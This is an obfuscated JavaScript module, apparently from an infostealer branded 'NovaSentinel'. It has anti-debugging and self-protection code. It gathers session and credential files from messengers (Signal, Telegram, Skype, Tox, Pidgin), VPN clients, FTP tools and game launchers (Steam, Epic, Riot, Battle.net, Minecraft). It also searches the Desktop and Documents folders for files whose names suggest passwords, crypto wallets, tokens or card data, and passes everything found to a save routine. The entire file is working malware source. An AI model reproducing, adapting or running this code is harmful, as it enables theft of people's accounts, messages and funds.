const _0x27ffef = (function () {
    let _0x4657b9 = true
    return function (_0x420453, _0x4564b0) {
      const _0x1f1134 = _0x4657b9
        ? function () {
            if (_0x4564b0) {
              const _0x4c27f5 = _0x4564b0.apply(_0x420453, arguments)
              return (_0x4564b0 = null), _0x4c27f5
            }
          }
        : function () {}
      return (_0x4657b9 = false), _0x1f1134
    }
  })(),
  _0x1c86e9 = _0x27ffef(this, function () {
    return _0x1c86e9
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x1c86e9)
      .search('(((.+)+)+)+$')
  })
_0x1c86e9()
const _0x2d5440 = (function () {
  let _0x418fd0 = true
  return function (_0x3d0f4c, _0x1e3c40) {
    const _0x24bc20 = _0x418fd0
      ? function () {
          if (_0x1e3c40) {
            const _0x572042 = _0x1e3c40.apply(_0x3d0f4c, arguments)
            return (_0x1e3c40 = null), _0x572042
          }
        }
      : function () {}
    return (_0x418fd0 = false), _0x24bc20
  }
})()
;(function () {
  _0x2d5440(this, function () {
    const _0x28ed89 = new RegExp('function *\\( *\\)')
    const _0x244981 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
      _0x368f1f = _0x36d4ad('init')
    !_0x28ed89.test(_0x368f1f + 'chain') || !_0x244981.test(_0x368f1f + 'input')
      ? _0x368f1f('0')
      : _0x36d4ad()
  })()
})()
const _0xbb2594 = (function () {
    let _0x353aa1 = true
    return function (_0x32534e, _0x5eb970) {
      const _0x1b2724 = _0x353aa1
        ? function () {
            if (_0x5eb970) {
              const _0x361257 = _0x5eb970.apply(_0x32534e, arguments)
              return (_0x5eb970 = null), _0x361257
            }
          }
        : function () {}
      return (_0x353aa1 = false), _0x1b2724
    }
  })(),
  _0x40e73f = _0xbb2594(this, function () {
    const _0x37235c = function () {
        let _0x47a40a
        try {
          _0x47a40a = Function(
            'return (function() {}.constructor("return this")( ));'
          )()
        } catch (_0x46d044) {
          _0x47a40a = window
        }
        return _0x47a40a
      },
      _0x10852c = _0x37235c(),
      _0x46f8ad = (_0x10852c.console = _0x10852c.console || {}),
      _0x56dce4 = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (let _0x5962fe = 0; _0x5962fe < _0x56dce4.length; _0x5962fe++) {
      const _0x84486a = _0xbb2594.constructor.prototype.bind(_0xbb2594),
        _0x327bd3 = _0x56dce4[_0x5962fe],
        _0x2605bb = _0x46f8ad[_0x327bd3] || _0x84486a
      _0x84486a['__proto__'] = _0xbb2594.bind(_0xbb2594)
      _0x84486a.toString = _0x2605bb.toString.bind(_0x2605bb)
      _0x46f8ad[_0x327bd3] = _0x84486a
    }
  })
_0x40e73f()
const _0x2b1ea1 = require('fs'),
  _0x311355 = require('./save'),
  { stat: _0x34cbde } = require('./stats'),
  _0x3f1354 = require('path'),
  _0x2b4c30 = process.env.appdata
const _0xb62f01 = process.env.localappdata
class _0x641022 {
  constructor(_0x4e39a7, _0x3238c0, _0x5be97d, _0x67a523) {
    this.name = _0x4e39a7
    this.mainfolder = _0x3238c0
    this.existpath = _0x5be97d
    this.stealpath = _0x67a523
  }
}
function _0x540e33() {
  const _0x5f20f3 = process.env.homepath
  const _0x33d369 = [
    new _0x641022('NationsGlory', 'Games', _0x2b4c30 + '\\NationsGlory\\', [
      _0x2b4c30 + '\\NationsGlory\\Local Storage/leveldb',
    ]),
    new _0x641022('Growtopia', 'Games', _0xb62f01 + '\\Growtopia\\', [
      _0xb62f01 + '\\Growtopia\\save.dat',
    ]),
    new _0x641022('Minecraft', 'Games', _0x2b4c30 + '\\.minecraft\\', []),
    new _0x641022(
      'Skype',
      'Social',
      _0x2b4c30 + '\\Microsoft\\Skype for Desktop\\Local Storage\\',
      [_0x2b4c30 + '\\Microsoft\\Skype for Desktop\\Local Storage\\']
    ),
    new _0x641022(
      'Element',
      'Social',
      _0x2b4c30 + '\\Element\\Local Storage\\',
      [_0x2b4c30 + '\\Element\\Local Storage\\']
    ),
    new _0x641022('Signal', 'Social', _0x2b4c30 + '\\Signal\\', [
      _0x2b4c30 + '\\Signal\\Local Storage\\',
      _0x2b4c30 + '\\Signal\\Session Storage\\',
      _0x2b4c30 + '\\Signal\\sql\\',
      _0x2b4c30 + '\\Signal\\databases\\',
      _0x2b4c30 + '\\Signal\\config.json',
    ]),
    new _0x641022('ICQ', 'Social', _0x2b4c30 + '\\ICQ\\0001\\', [
      _0x2b4c30 + '\\ICQ\\0001\\',
    ]),
    new _0x641022('FileZilla', 'Clients', _0x2b4c30 + '\\FileZilla\\', [
      _0x2b4c30 + '\\FileZilla\\recentservers.xml',
    ]),
    new _0x641022('OpenVPN Connect', 'VPN', _0x2b4c30 + '\\OpenVPN Connect\\', [
      _0x2b4c30 + '\\OpenVPN Connect\\profiles',
    ]),
    new _0x641022('Shadow', 'Clients', _0x2b4c30 + '\\shadow\\', [
      _0x2b4c30 + '\\shadow\\Local State',
      _0x2b4c30 + '\\shadow\\Local Storage\\',
      _0x2b4c30 + '\\shadow\\Session Storage\\',
    ]),
    new _0x641022('TotalCommander', 'Clients', _0x2b4c30 + '\\GHISLER\\', [
      _0x2b4c30 + '\\GHISLER\\wcx_ftp.ini',
    ]),
    new _0x641022(
      'LunarClient',
      'Games',
      _0x5f20f3 + '\\.lunarclient\\settings\\game\\',
      []
    ),
    new _0x641022('FeatherClient', 'Games', _0x2b4c30 + '\\.feather\\', []),
    new _0x641022(
      'EssentialClient',
      'Games',
      _0x2b4c30 + '\\.minecraft\\essential\\',
      []
    ),
    new _0x641022(
      'TLauncher',
      'Games',
      _0x2b4c30 + '\\.tlauncher\\mcl\\Minecraft\\game\\',
      []
    ),
  ]
  for (let _0x68f56a = 0; _0x68f56a < _0x33d369.length; _0x68f56a++) {
    const _0x6b64fc = _0x33d369[_0x68f56a]
    if (_0x2b1ea1.existsSync(_0x6b64fc.existpath)) {
      _0x6b64fc.mainfolder == 'SysAdmin' &&
        _0x34cbde.AddSysAdmin(_0x6b64fc.name)
      _0x6b64fc.mainfolder == 'Social' && _0x34cbde.AddMessenger(_0x6b64fc.name)
      ;(_0x6b64fc.mainfolder == 'Games' ||
        !_0x6b64fc.name.includes('craft') ||
        !_0x6b64fc.name.includes('lunar') ||
        !_0x6b64fc.existpath.includes('feather')) &&
        _0x34cbde.AddGames(_0x6b64fc.name)
      if (
        _0x6b64fc.existpath.includes('craft') ||
        _0x6b64fc.existpath.includes('lunarclient') ||
        _0x6b64fc.existpath.includes('feather')
      ) {
        const _0xff3ab4 = _0x2b1ea1.readdirSync(_0x6b64fc.existpath),
          _0x36e7cb = _0xff3ab4.filter(
            (_0x41fa91) =>
              _0x41fa91.includes('.json') ||
              _0x41fa91.includes('.txt') ||
              _0x41fa91.includes('.dat')
          )
        _0x36e7cb.forEach((_0x529260) => {
          const _0x4f8579 = _0x3f1354.join(_0x6b64fc.existpath, _0x529260)
          _0x529260.includes('.json') && _0x34cbde.addMinecraft(_0x4f8579)
          _0x6b64fc.stealpath.push(_0x4f8579)
        })
        _0x34cbde.AddGames(_0x6b64fc.name)
      }
      _0x311355.ArraySave(
        _0x6b64fc.stealpath,
        _0x6b64fc.mainfolder,
        _0x6b64fc.name
      )
    }
  }
}
function _0x5a5843(_0x2f70ff) {
  if (_0x2f70ff != 'yes') {
    return
  }
  const _0x566825 = [
    'C:\\program files (x86)\\steam\\',
    'C:\\program files\\steam\\',
  ]
  var _0x43a361 = []
  for (let _0x11d14c = 0; _0x11d14c < _0x566825.length; _0x11d14c++) {
    const _0x1a6846 = _0x566825[_0x11d14c]
    if (_0x2b1ea1.existsSync(_0x1a6846)) {
      const _0x1b9c38 = _0x2b1ea1.readdirSync(_0x1a6846)
      for (let _0x2a735d = 0; _0x2a735d < _0x1b9c38.length; _0x2a735d++) {
        const _0x5d5d7a = _0x1b9c38[_0x2a735d],
          _0x275cc7 = _0x1a6846 + _0x5d5d7a
        _0x5d5d7a.includes('ssfn') && _0x43a361.push(_0x275cc7)
      }
      const _0x331b1b = _0x1a6846 + 'config\\'
      _0x2b1ea1.existsSync(_0x331b1b) && _0x43a361.push(_0x331b1b)
    }
  }
  if (_0x43a361.length != 0) {
    _0x34cbde.AddGames('Steam')
    _0x311355.ArraySave(_0x43a361, 'Launcher', 'Steam')
  }
}
function _0x52ff29(_0x130b6e) {
  if (_0x130b6e != 'yes') {
    return
  }
  const _0x4249e8 = _0x2b4c30 + '\\Telegram Desktop\\tdata\\'
  if (!_0x2b1ea1.existsSync(_0x4249e8)) {
    return
  }
  var _0x59e5ea = []
  const _0x46dbf6 = _0x2b1ea1.readdirSync(_0x4249e8)
  for (var _0x1ce8cf = 0; _0x1ce8cf < _0x46dbf6.length; _0x1ce8cf++) {
    const _0x290b26 = _0x46dbf6[_0x1ce8cf],
      _0x290dd8 = _0x4249e8 + _0x290b26
    if (_0x2b1ea1.lstatSync(_0x290dd8).isDirectory()) {
      if (_0x290b26.length != 16) {
        continue
      }
      _0x59e5ea.push(_0x290dd8 + '//')
    } else {
      ;(_0x290b26.endsWith('s') || _0x290b26.length == 17) &&
        _0x59e5ea.push(_0x290dd8)
      ;(_0x290b26.startsWith('settings') ||
        _0x290b26.startsWith('key_data') ||
        _0x290b26.startsWith('usertag')) &&
        _0x59e5ea.push(_0x290dd8)
    }
  }
  _0x34cbde.AddMessenger('Telegram')
  _0x311355.ArraySave(_0x59e5ea, 'Social', 'Telegram')
}
function _0x483d40(_0x282906) {
  if (_0x282906 != 'yes') {
    return
  }
  const _0x553518 = _0x2b4c30 + '\\tox\\'
  var _0x466ef7 = []
  if (!_0x2b1ea1.existsSync(_0x553518)) {
    return
  }
  if (_0x2b1ea1.existsSync(_0x553518)) {
    const _0x18aac5 = _0x2b1ea1.readdirSync(_0x553518)
    for (let _0x708bb8 = 0; _0x708bb8 < _0x18aac5.length; _0x708bb8++) {
      const _0x419072 = _0x18aac5[_0x708bb8],
        _0x5eaabd = _0x553518 + _0x419072
      ;(_0x419072.endsWith('.tox') ||
        _0x419072.endsWith('.ini') ||
        _0x419072.endsWith('.db')) &&
        _0x466ef7.push(_0x5eaabd)
    }
  }
  _0x34cbde.AddMessenger('Tox')
  _0x311355.ArraySave(_0x466ef7, 'Social', 'Tox')
}
function _0x384710(_0x25f359) {
  if (!_0x25f359) {
    return
  }
  const _0x3bce7f = _0x2b4c30 + '\\.purple\\'
  if (!_0x2b1ea1.existsSync(_0x3bce7f)) {
    return
  }
  _0x2b1ea1.existsSync(_0x3bce7f + 'accounts.xml') &&
    (_0x34cbde.AddMessenger('Pidgin'),
    _0x311355.ArraySave([_0x3bce7f + 'accounts.xml'], 'Social', 'Pidgin'))
}
function _0x2256ec(_0x56c2e1) {
  if (_0x56c2e1 != 'yes') {
    return
  }
  const _0x3370f2 = _0xb62f01 + '\\NordVPN\\'
  if (!_0x2b1ea1.existsSync(_0x3370f2)) {
    return
  }
  const _0x2177fe = _0x2b1ea1.readdirSync(_0x3370f2)
  var _0x26f1ba = []
  for (let _0x41720b = 0; _0x41720b < _0x2177fe.length; _0x41720b++) {
    const _0x26614c = _0x2177fe[_0x41720b],
      _0x4452e6 = _0x3370f2 + _0x26614c + '\\'
    if (_0x2b1ea1.statSync(_0x4452e6).isDirectory) {
      if (_0x26614c.includes('exe')) {
        const _0x1ff681 = _0x2b1ea1.readdirSync(_0x4452e6)
        for (let _0x28f927 = 0; _0x28f927 < _0x1ff681.length; _0x28f927++) {
          const _0x5c7787 = _0x1ff681[_0x28f927]
          _0x2b1ea1.existsSync(_0x4452e6 + _0x5c7787 + '\\user.config') &&
            _0x26f1ba.push(_0x4452e6 + _0x5c7787 + '\\user.config')
        }
      }
    }
  }
  _0x34cbde.AddVpn('NordVPN')
  _0x311355.ArraySave(_0x26f1ba, 'VPN', 'NordVPN')
}
function _0x43fabb(_0x3fd83f) {
  if (_0x3fd83f != 'yes') {
    return
  }
  const _0x29dc1a = _0xb62f01 + '\\ProtonVPN\\'
  if (!_0x2b1ea1.existsSync(_0x29dc1a)) {
    return
  }
  const _0x1cff4e = _0x2b1ea1.readdirSync(_0x29dc1a)
  var _0x237a83 = []
  for (let _0x32da8e = 0; _0x32da8e < _0x1cff4e.length; _0x32da8e++) {
    const _0x3cf843 = _0x1cff4e[_0x32da8e],
      _0x5c07a8 = _0x29dc1a + _0x3cf843 + '\\'
    if (_0x2b1ea1.statSync(_0x5c07a8).isDirectory) {
      if (_0x3cf843.includes('exe')) {
        const _0x594e33 = _0x2b1ea1.readdirSync(_0x5c07a8)
        for (let _0x2bfe1d = 0; _0x2bfe1d < _0x594e33.length; _0x2bfe1d++) {
          const _0x573a03 = _0x594e33[_0x2bfe1d]
          if (_0x2b1ea1.existsSync(_0x5c07a8 + _0x573a03 + '\\user.config')) {
            _0x237a83.push(_0x5c07a8 + _0x573a03 + '\\user.config')
          }
        }
      }
    }
  }
  _0x34cbde.AddVpn('ProtonVPN')
  _0x311355.ArraySave(_0x237a83, 'VPN', 'ProtonVPN')
}
function _0x20d4d5(_0x36e5bc) {
  if (_0x36e5bc != 'yes') {
    return
  }
  let _0x185626 = _0xb62f01 + '\\Riot Games\\Riot Client\\Data\\'
  try {
    var _0x2ce2f2 = []
    if (_0x2b1ea1.existsSync(_0x3f1354)) {
      const _0xc40279 = _0x2b1ea1.readdirSync(_0x185626)
      for (let _0x20fdd8 = 0; _0x20fdd8 < _0xc40279.length; _0x20fdd8++) {
        const _0x4ab302 = _0xc40279[_0x20fdd8],
          _0x28e2da = _0x3f1354 + _0x4ab302
        _0x2ce2f2.push(_0x28e2da)
      }
    }
    if (_0x2ce2f2.length != 0) {
      _0x34cbde.AddGames('Riotgames')
      _0x311355.ArraySave(_0x2ce2f2, 'Launcher', 'RiotGames')
    }
  } catch (_0x10c55e) {}
}
function _0xab66(_0x1a1ca5) {
  if (_0x1a1ca5 != 'yes') {
    return
  }
  let _0x2142f4 = []
  try {
    const _0x37c89b =
        _0xb62f01 + '\\EpicGamesLauncher\\Saved\\Config\\Windows\\',
      _0x44bb71 = _0x3f1354.join(_0x37c89b, 'GameUserSettings.ini')
    if (_0x2b1ea1.existsSync(_0x37c89b) && _0x2b1ea1.existsSync(_0x44bb71)) {
      const _0x5e2ed2 = _0x2b1ea1.readFileSync(_0x44bb71, 'utf-8')
      if (_0x5e2ed2.includes('[RememberMe]')) {
        const _0x598474 = _0x2b1ea1.readdirSync(_0x37c89b)
        for (let _0x48e7b7 = 0; _0x48e7b7 < _0x598474.length; _0x48e7b7++) {
          const _0x1d4c3e = _0x598474[_0x48e7b7],
            _0x3b085c = _0x37c89b + _0x1d4c3e
          _0x2142f4.push(_0x3b085c)
        }
      }
      _0x34cbde.AddGames('EpicGame')
      _0x311355.ArraySave(_0x2142f4, 'Launcher', 'EpicGame')
    }
  } catch (_0x30f567) {}
}
function _0x5507fd(_0x5e9eb6) {
  if (_0x5e9eb6 != 'yes') {
    return
  }
  let _0x249d1c = _0xb62f01 + '\\Ubisoft Game Launcher\\'
  try {
    var _0x45f076 = []
    if (_0x2b1ea1.existsSync(_0x3f1354)) {
      const _0x348f0c = _0x2b1ea1.readdirSync(_0x249d1c)
      for (let _0x9a2ac4 = 0; _0x9a2ac4 < _0x348f0c.length; _0x9a2ac4++) {
        const _0x44aec1 = _0x348f0c[_0x9a2ac4],
          _0x4ddb10 = _0x3f1354 + _0x44aec1
        _0x45f076.push(_0x4ddb10)
      }
    }
    if (_0x45f076.length != 0) {
      _0x34cbde.AddGames('Ubisoft')
      _0x311355.ArraySave(_0x45f076, 'Launcher', 'Ubisoft')
    }
  } catch (_0xf9615) {}
}
function _0x5b1b43(_0x29e502) {
  if (_0x29e502 != 'yes') {
    return
  }
  const _0x4a49f6 = _0x2b4c30 + '\\OpenVPN Connect\\profiles\\'
  var _0x38ba4c = []
  if (!_0x2b1ea1.existsSync(_0x4a49f6)) {
    return
  }
  const _0x56dcf2 = _0x2b1ea1.readdirSync(_0x4a49f6)
  for (let _0x1fcb63 = 0; _0x1fcb63 < _0x56dcf2.length; _0x1fcb63++) {
    const _0x9a8a = _0x56dcf2[_0x1fcb63],
      _0x18cc33 = _0x4a49f6 + _0x9a8a
    _0x38ba4c.push(_0x18cc33)
  }
  _0x34cbde.AddGames('OpenVPN')
  _0x311355.ArraySave(_0x38ba4c, 'VPN', 'OpenVPN')
}
function _0x51473a(_0x36d4ee) {
  if (_0x36d4ee != 'yes') {
    return
  }
  const _0x25a69e = _0x2b4c30 + '\\Battle.net\\'
  var _0x4e9b91 = []
  if (!_0x2b1ea1.existsSync(_0x25a69e)) {
    return
  }
  const _0x2a8708 = _0x2b1ea1.readdirSync(_0x25a69e)
  for (let _0x3c676d = 0; _0x3c676d < _0x2a8708.length; _0x3c676d++) {
    const _0x3fe616 = _0x2a8708[_0x3c676d],
      _0x3f4ed6 = _0x25a69e + _0x3fe616
    ;(_0x3fe616.includes('db') || _0x3fe616.includes('config')) &&
      _0x4e9b91.push(_0x3f4ed6)
  }
  _0x34cbde.AddGames('Battle.net')
  _0x311355.ArraySave(_0x4e9b91, 'Launcher', 'Battlenet')
}
function _0xc3ff9d() {
  try {
    const _0x475d7b =
        'riseup,passw,mdp,motdepasse,mot_de_passe,login,secret,account,acount,paypal,banque,account,metamask,wallet,crypto,exodus,discord,2fa,code,memo,compte,token,backup,seecret,psw,mullvad,rdp,amazon,creditcard,minecraft,nike,zalando,a2f,discord,token,mot de passe,vpn,steam,epicgame,bitwarden,card,vps,jordan,hack,trustwallet,memomic,passphrase',
      _0x3211f5 =
        'riseup,passw,mdp,motdepasse,mot_de_passe,login,secret,account,acount,paypal,banque,account,metamask,wallet,crypto,exodus,discord,2fa,code,memo,compte,token,backup,seecret,psw,mullvad,rdp,amazon,creditcard,minecraft,nike,zalando,a2f,discord,token,mot de passe,vpn,steam,epicgame,bitwarden,card,vps,jordan,hack,trustwallet,memomic,passphrase',
      _0x43d48d = _0x2b1ea1.readdirSync(
        _0x3f1354.join(process.env.userprofile, 'Desktop/')
      ),
      _0x47a5fc = _0x2b1ea1.readdirSync(
        _0x3f1354.join(process.env.userprofile, 'Documents/')
      )
    let _0x357728 = []
    for (let _0x1549ba = 0; _0x1549ba < _0x43d48d.length; _0x1549ba++) {
      const _0x9e96ef = _0x43d48d[_0x1549ba]
      for (let _0x11e1a4 = 0; _0x11e1a4 < _0x475d7b.length; _0x11e1a4++) {
        const _0x4c8674 = _0x475d7b[_0x11e1a4]
        _0x9e96ef.match(new RegExp(_0x4c8674)) &&
          _0x357728.push(
            _0x3f1354.join(process.env.userprofile, 'Desktop', _0x9e96ef)
          )
      }
    }
    for (let _0x22a873 = 0; _0x22a873 < _0x47a5fc.length; _0x22a873++) {
      const _0x321d6f = _0x47a5fc[_0x22a873]
      for (let _0x3fb0e7 = 0; _0x3fb0e7 < _0x3211f5.length; _0x3fb0e7++) {
        const _0x3b027b = _0x3211f5[_0x3fb0e7]
        _0x321d6f.match(new RegExp(_0x3b027b)) &&
          _0x357728.push(
            _0x3f1354.join(process.env.userprofile, 'Documents', _0x321d6f)
          )
      }
    }
    _0x311355.ArraySave(
      Array.from(new Set(_0x357728)),
      'FilesNovaSentinelber',
      ''
    )
  } catch {}
}
module.exports = {
  NovaSentinelSimple: _0x540e33,
  NovaSentinelSteam: _0x5a5843,
  NovaSentinelTelegram: _0x52ff29,
  NovaSentinelTox: _0x483d40,
  NovaSentinelProton: _0x43fabb,
  NovaSentinelBattle: _0x51473a,
  NovaSentinelPidgin: _0x384710,
  fileNovaSentinelber: _0xc3ff9d,
  NovaSentinelEpicGame: _0xab66,
  NovaSentinelRiotGame: _0x20d4d5,
  NovaSentinelUbisoft: _0x5507fd,
  NovaSentinelNordVPN: _0x2256ec,
  NovaSentinelOpenVPN: _0x5b1b43,
}
function _0x36d4ad(_0x2c0a0b) {
  function _0x1ff8e4(_0x2ee140) {
    if (typeof _0x2ee140 === 'string') {
      return function (_0x15aa75) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x2ee140 / _0x2ee140).length !== 1 || _0x2ee140 % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x1ff8e4(++_0x2ee140)
  }
  try {
    if (_0x2c0a0b) {
      return _0x1ff8e4
    } else {
      _0x1ff8e4(0)
    }
  } catch (_0x155a93) {}
}
